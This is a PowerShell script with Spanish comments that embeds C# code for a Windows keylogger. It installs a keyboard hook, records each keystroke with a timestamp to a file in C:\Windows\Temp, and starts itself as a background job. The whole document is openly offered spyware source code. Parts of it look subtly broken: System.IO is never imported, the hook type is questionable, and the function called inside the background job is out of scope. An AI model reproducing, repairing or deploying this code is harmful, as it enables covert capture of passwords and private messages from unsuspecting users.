Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class KeyLogger
{
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc hookProc, IntPtr hInstance, uint threadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hInstance, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr hookId = IntPtr.Zero;
    private static StreamWriter logFile;

    public static void Start()
    {
        string logPath = "C:\\Windows\\Temp\\logs.txt";
        logFile = new StreamWriter(logPath, true);
        using (logFile)
        {
            hookId = SetWindowsHookEx(2, new HookProc(HookCallback), GetModuleHandle(null), 0);
            Application.Run();
            UnhookWindowsHookEx(hookId);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)256)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            logFile.WriteLine($"{DateTime.Now}: {key}");
            logFile.Flush();
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

# Función para iniciar el keylogger
function Start-KeyLogger {
    [KeyLogger]::Start()
}

# Ejecutar el keylogger en segundo plano
Start-Job -ScriptBlock { Start-KeyLogger }